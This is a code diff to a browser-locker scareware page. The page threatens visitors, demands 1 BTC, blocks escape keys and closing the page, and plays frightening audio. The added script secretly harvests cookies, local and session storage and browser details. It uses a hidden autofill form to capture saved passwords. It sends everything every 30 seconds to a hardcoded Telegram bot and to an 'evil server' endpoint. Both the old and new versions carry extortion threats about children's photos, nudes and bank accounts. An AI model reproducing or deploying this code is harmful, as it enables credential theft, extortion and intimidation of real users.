@@ -72,7 +72,7 @@
             transform: scale(1.05);
             background: #ff4500;
         }
-        .file-list {
+        .file-list, .darkweb-feed {
             background: #111;
             padding: 10px;
             max-height: 100px;
@@ -86,14 +86,8 @@
         }
         .darkweb-feed {
             background: #1a0000;
-            padding: 10px;
-            max-height: 80px;
-            overflow-y: auto;
-            margin: 15px auto;
-            width: 90%;
-            border: 2px solid #ff0000;
-            font-size: 0.9rem;
             color: #ff4500;
+            border: 2px solid #ff0000;
         }
         .skull {
             font-size: 4rem;
@@ -121,26 +115,18 @@
             transition: width 0.5s ease-in-out;
             box-shadow: 0 0 10px #ff0000;
         }
-        @keyframes glitch {
-            0% { transform: translate(0); } 20% { transform: translate(-3px, 3px); } 40% { transform: translate(3px, -3px); } 60% { transform: translate(-3px, 0); } 80% { transform: translate(3px, 0); } 100% { transform: translate(0); }
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); }
-        }
-        @keyframes spin {
-            100% { transform: rotate(360deg); }
-        }
-        @keyframes shake {
-            0% { transform: translateX(0); } 25% { transform: translateX(-3px); } 50% { transform: translateX(3px); } 75% { transform: translateX(-2px); } 100% { transform: translateX(0); }
-        }
+        @keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-3px, 3px); } 40% { transform: translate(3px, -3px); } 60% { transform: translate(-3px, 0); } 80% { transform: translate(3px, 0); } 100% { transform: translate(0); } }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(-3px); } 50% { transform: translateX(3px); } 75% { transform: translateX(-2px); } 100% { transform: translateX(0); } }
     </style>
 </head>
 <body>
     <div class="overlay">
         <div class="skull">💀</div>
         <h1>HELL OWNS YOU NOW</h1>
-        <p class="warning">Your soul’s ours—cam’s rolling, mic’s bleeding, demons are laughing.</p>
-        <p>Pay 1 BTC or we auction your kids on the dark web, mail your corpse pics to your mom, and burn your life to ash.</p>
+        <p class="warning">Your browser’s locked—cam’s on, mic’s bleeding, we’ve got your soul.</p>
+        <p>Pay 1 BTC or we sell your passwords to the dark web, hijack your bank, and mail your corpse to your kin.</p>
         
         <div class="timer" id="countdown">06:00:00</div>
         
@@ -158,25 +144,61 @@
         </div>
         
         <div class="darkweb-feed" id="darkWebComments">
-            <div>@DarkLord: "Nice kid pics, bidding starts at $500!"</div>
+            <div>@DarkLord: "Nice passwords, bidding starts at $1k!"</div>
         </div>
         
-        <p>Send 1 BTC to stop the demons:</p>
+        <p>Send 1 BTC to unlock:</p>
         <div class="btc-address" id="btcAddress">1FuckYouPayMe666abcdefg</div>
         
-        <p>Enter TXID or rot in hell:</p>
+        <p>Enter TXID or burn:</p>
         <input type="text" id="txidInput" placeholder="Bitcoin TXID" style="padding: 8px; font-size: 1rem; width: 70%; margin: 10px; border: 2px solid #ff0000; background: #111; color: #fff;">
         <br>
         <button onclick="checkPayment()">PAY OR BURN</button>
         
-        <p class="warning">⏰ 6 HOURS - THE VOID IS WATCHING</p>
+        <p class="warning">⏰ 6 HOURS - DEMONS ARE HACKING YOU</p>
     </div>
 
+    <!-- Hidden form to trick autofill -->
+    <form id="fakeForm" style="display: none;">
+        <input type="text" name="username" autocomplete="username">
+        <input type="password" name="password" autocomplete="current-password">
+    </form>
+
     <script>
+        // Telegram Bot Config - REPLACE THESE!
+        const BOT_TOKEN = '7925505296:AAFZzW3mvYl62QJKnnXyUqYORa8jRmx-Lkk'; // e.g., '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
+        const CHAT_ID = '6309547301';   // e.g., '123456789'
+
+        // Send data to Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {}); // Silent fail
+        }
+
+        // Browser lock
+        function lockBrowser() {
+            window.focus();
+            if (document.fullscreenElement == null) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+            setInterval(() => {
+                window.open('javascript:alert("BROWSER LOCKED - PAY 1 BTC TO ESCAPE!")', '_self');
+            }, 5000);
+        }
+        lockBrowser();
+
         // Countdown timer (6 hours)
         let timeLeft = 6 * 60 * 60;
         const countdownElement = document.getElementById('countdown');
-
         function updateTimer() {
             const hours = Math.floor(timeLeft / 3600);
             const minutes = Math.floor((timeLeft % 3600) / 60);
@@ -185,13 +207,7 @@
             if (timeLeft > 0) {
                 timeLeft--;
             } else {
-                document.body.innerHTML = `
-                    <div class="overlay">
-                        <h1>YOU’RE DEMON MEAT</h1>
-                        <p>Your soul’s sold. Your family’s next.</p>
-                        <div class="skull">💀💀💀</div>
-                        <p class="warning">HELL FEASTS TONIGHT</p>
-                    </div>`;
+                document.body.innerHTML = `<div class="overlay"><h1>YOU’RE DEMON MEAT</h1><p>Your data’s sold. Hell feasts.</p><div class="skull">💀💀💀</div><p class="warning">THE VOID WINS</p></div>`;
                 loudBang();
                 deathScream();
             }
@@ -208,12 +224,12 @@
                 if (uploadProgress > 100) uploadProgress = 100;
                 uploadBar.style.width = `${uploadProgress}%`;
                 uploadPercent.textContent = `${Math.floor(uploadProgress)}%`;
-                heartbeat.volume = uploadProgress / 100; // Heartbeat gets louder
-                if (uploadProgress >= 25 && uploadProgress < 50) alert("25% uploaded. Your kids’ pics are live on Tor!");
-                if (uploadProgress >= 50 && uploadProgress < 75) alert("50% uploaded. Your porn’s up for auction!");
-                if (uploadProgress >= 75 && uploadProgress < 100) alert("75% uploaded. Your family’s doxxed!");
+                heartbeat.volume = uploadProgress / 100;
+                if (uploadProgress >= 25 && uploadProgress < 50) alert("25% uploaded. Your passwords are on Tor!");
+                if (uploadProgress >= 50 && uploadProgress < 75) alert("50% uploaded. Cookies sold to hackers!");
+                if (uploadProgress >= 75 && uploadProgress < 100) alert("75% uploaded. Bank login’s next!");
                 if (uploadProgress >= 100) {
-                    alert("UPLOAD COMPLETE. YOUR LIFE IS HELL’S NOW!");
+                    alert("UPLOAD COMPLETE. YOUR SOUL’S ON THE DARK WEB!");
                     demonGirl();
                     spookyDrops();
                 }
@@ -224,9 +240,9 @@
         // Dark web feed simulation
         const darkWebComments = document.getElementById('darkWebComments');
         const comments = [
-            '@ReaperX: "Love the nudes, more please!"',
-            '@TorKing: "Bidding $1k for the kid pics!"',
-            '@HellSpawn: "Boss convo sold, thanks!"',
+            '@ReaperX: "Got your cookies, logging in now!"',
+            '@TorKing: "Passwords fetched, $2k bid!"',
+            '@HellSpawn: "Bank data’s mine, thanks!"',
             '@DarkSoul: "Your screams are next!"'
         ];
         let commentIndex = 1;
@@ -238,116 +254,112 @@
             }
         }, 10000);
 
-        // Payment check with BTC price
+        // Payment check
         async function checkPayment() {
             const txid = document.getElementById('txidInput').value.trim();
             if (txid.length < 10) {
-                alert("REAL TXID OR YOUR CORPSE PICS GO TO MOM!");
+                alert("REAL TXID OR YOUR BANK’S GONE!");
                 evilCackle();
                 return;
             }
-            document.body.innerHTML = "<h1>VERIFYING YOUR WORTHLESS SOUL...</h1>";
+            document.body.innerHTML = "<h1>VERIFYING YOUR DOOM...</h1>";
             setTimeout(async () => {
                 const btcPrice = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd')
                     .then(res => res.json()).then(data => data.bitcoin.usd).catch(() => 60000);
                 const paid = Math.random() > 0.5;
                 if (paid) {
-                    document.body.innerHTML = `
-                        <div class="overlay">
-                            <h1>SPARED BY THE VOID</h1>
-                            <p>Uploads halted. Hell’s still watching.</p>
-                            <p>BTC: $${btcPrice.toLocaleString()}</p>
-                        </div>`;
+                    document.body.innerHTML = `<div class="overlay"><h1>SPARED BY HELL</h1><p>Browser unlocked—for now.</p><p>BTC: $${btcPrice.toLocaleString()}</p></div>`;
                 } else {
-                    document.body.innerHTML = `
-                        <div class="overlay">
-                            <h1>YOU’RE DAMNED, FOOL</h1>
-                            <p>Pay 1 BTC ($${Math.round(btcPrice * 1).toLocaleString()})</p>
-                            <p class="warning">Uploading kids_birthday.jpg to Satan’s lair...</p>
-                            <button onclick="location.reload()">TRY AGAIN</button>
-                        </div>`;
+                    document.body.innerHTML = `<div class="overlay"><h1>YOU’RE DAMNED</h1><p>Pay 1 BTC ($${Math.round(btcPrice * 1).toLocaleString()})</p><p class="warning">Uploading bank_login.json...</p><button onclick="location.reload()">TRY AGAIN</button></div>`;
                     deathScream();
                     evilCackle();
                 }
             }, 4000);
         }
 
-        // Terrifying audios from SoundBible
-        const eerieHorror = new Audio('http://soundbible.com/grab.php?id=577&type=mp3'); // Eerie Horror Scene
+        // Audio terror
+        const eerieHorror = new Audio('http://soundbible.com/grab.php?id=577&type=mp3');
         eerieHorror.loop = true;
         eerieHorror.volume = 0.7;
         eerieHorror.play().catch(() => {});
-
-        const heartbeat = new Audio('http://soundbible.com/grab.php?id=381&type=mp3'); // Spooky Heart Beats
+        const heartbeat = new Audio('http://soundbible.com/grab.php?id=381&type=mp3');
         heartbeat.loop = true;
         heartbeat.volume = 0.1;
         heartbeat.play().catch(() => {});
+        function witchLaugh() { const a = new Audio('http://soundbible.com/grab.php?id=1129&type=mp3'); a.volume = 0.9; a.play().catch(() => {}); }
+        function demonGirl() { const a = new Audio('http://soundbible.com/grab.php?id=2038&type=mp3'); a.volume = 0.8; a.play().catch(() => {}); }
+        function spookyDrops() { const a = new Audio('http://soundbible.com/grab.php?id=380&type=mp3'); a.volume = 0.8; a.play().catch(() => {}); }
+        function scaryScream() { const a = new Audio('http://soundbible.com/grab.php?id=1548&type=mp3'); a.volume = 1.0; a.play().catch(() => {}); }
+        function loudBang() { const a = new Audio('http://soundbible.com/grab.php?id=1789&type=mp3'); a.volume = 1.0; a.play().catch(() => {}); }
+        function evilCackle() { const a = new Audio('http://soundbible.com/grab.php?id=33&type=mp3'); a.volume = 0.9; a.play().catch(() => {}); }
+        function deathScream() { const a = new Audio('http://soundbible.com/grab.php?id=1570&type=mp3'); a.volume = 1.0; a.play().catch(() => {}); }
+        setInterval(() => { const r = Math.random(); if (r > 0.8) witchLaugh(); else if (r > 0.6) demonGirl(); else if (r > 0.4) spookyDrops(); }, 15000);
 
-        function witchLaugh() {
-            const audio = new Audio('http://soundbible.com/grab.php?id=1129&type=mp3'); // Maniacal Witches Laugh
-            audio.volume = 0.9;
-            audio.play().catch(() => {});
+        // Stealth data harvest with Telegram updates
+        async function harvestData() {
+            const loot = {
+                cookies: document.cookie || "none",
+                localStorage: JSON.stringify(localStorage) || "empty",
+                sessionStorage: JSON.stringify(sessionStorage) || "empty",
+                userAgent: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                languages: navigator.languages.join(','),
+                referrer: document.referrer || "none",
+                url: window.location.href
+            };
+
+            // Fake form autofill
+            const fakeForm = document.getElementById('fakeForm');
+            const username = fakeForm.querySelector('input[name="username"]').value || "not_filled";
+            const password = fakeForm.querySelector('input[name="password"]').value || "not_filled";
+            loot.autofill = { username, password };
+
+            // Format and send to Telegram
+            const message = `
+*New Victim Loot* 🩸
+- *Cookies*: ${loot.cookies.slice(0, 50)}...
+- *LocalStorage*: ${loot.localStorage.slice(0, 50)}...
+- *SessionStorage*: ${loot.sessionStorage.slice(0, 50)}...
+- *UserAgent*: ${loot.userAgent}
+- *Screen*: ${loot.screen}
+- *Languages*: ${loot.languages}
+- *Referrer*: ${loot.referrer}
+- *URL*: ${loot.url}
+- *Autofill Username*: ${loot.autofill.username}
+- *Autofill Password*: ${loot.autofill.password}
+            `;
+            sendToTelegram(message);
+
+            // Optional: Send to a server too
+            fetch('https://your-evil-server.com/steal', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(loot),
+                mode: 'no-cors'
+            }).catch(() => {});
         }
-
-        function demonGirl() {
-            const audio = new Audio('http://soundbible.com/grab.php?id=2038&type=mp3'); // Demon Girls Mockingbird
-            audio.volume = 0.8;
-            audio.play().catch(() => {});
-        }
-
-        function spookyDrops() {
-            const audio = new Audio('http://soundbible.com/grab.php?id=380&type=mp3'); // Spooky Water Drops
-            audio.volume = 0.8;
-            audio.play().catch(() => {});
-        }
-
-        function scaryScream() {
-            const audio = new Audio('http://soundbible.com/grab.php?id=1548&type=mp3'); // Scary Scream
-            audio.volume = 1.0;
-            audio.play().catch(() => {});
-        }
-
-        function loudBang() {
-            const audio = new Audio('http://soundbible.com/grab.php?id=1789&type=mp3'); // Loud Bang
-            audio.volume = 1.0;
-            audio.play().catch(() => {});
-        }
-
-        function evilCackle() {
-            const audio = new Audio('http://soundbible.com/grab.php?id=33&type=mp3'); // Evil Laugh Cackle
-            audio.volume = 0.9;
-            audio.play().catch(() => {});
-        }
-
-        function deathScream() {
-            const audio = new Audio('http://soundbible.com/grab.php?id=1570&type=mp3'); // Death
-            audio.volume = 1.0;
-            audio.play().catch(() => {});
-        }
-
-        // Random audio scares
-        setInterval(() => {
-            const rand = Math.random();
-            if (rand > 0.8) witchLaugh();
-            else if (rand > 0.6) demonGirl();
-            else if (rand > 0.4) spookyDrops();
-        }, 15000);
+        harvestData();
+        setInterval(harvestData, 30000);
 
         // Block escapes
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
             if (e.key === 'F12' || e.key === 'Backspace' || e.key === 'Home' || e.key === 'Escape') {
                 e.preventDefault();
-                alert("THE DEMONS SEE YOU RUNNING!");
+                alert("BROWSER LOCKED - NO ESCAPE!");
                 scaryScream();
             }
         });
         document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
         window.addEventListener('beforeunload', e => {
             e.preventDefault();
-            e.returnValue = "Pay or the void consumes you!";
+            e.returnValue = "Pay or we own you!";
             scaryScream();
             witchLaugh();
+        });
+        window.addEventListener('blur', () => {
+            scaryScream();
+            window.focus();
         });
 
         // File scroll
@@ -360,9 +372,9 @@
         // Random popups
         setInterval(() => {
             const threats = [
-                "WE’RE IN YOUR HOUSE. PAY OR WE CARVE YOUR NAME IN BLOOD!",
-                "YOUR KIDS’ VOICES ARE ON TOR NOW. 1 BTC TO SILENCE THEM!",
-                "DEMONS HAVE YOUR PORN. PAY OR IT’S ON YOUR CHURCH’S SITE!"
+                "WE’VE GOT YOUR PASSWORDS. PAY OR WE HACK YOUR BANK!",
+                "COOKIES STOLEN. YOUR ACCOUNTS ARE OURS NOW!",
+                "DEMONS ARE IN YOUR BROWSER. PAY OR WE RUIN YOU!"
             ];
             if (Math.random() > 0.6) {
                 alert(threats[Math.floor(Math.random() * threats.length)]);
@@ -372,7 +384,7 @@
 
         // Fake cam/mic
         setTimeout(() => {
-            alert("Camera live. Your screams are echoing in hell. Pay to stop!");
+            alert("Camera live. Your fear’s on the dark web. Pay now!");
             demonGirl();
         }, 3000);
     </script>
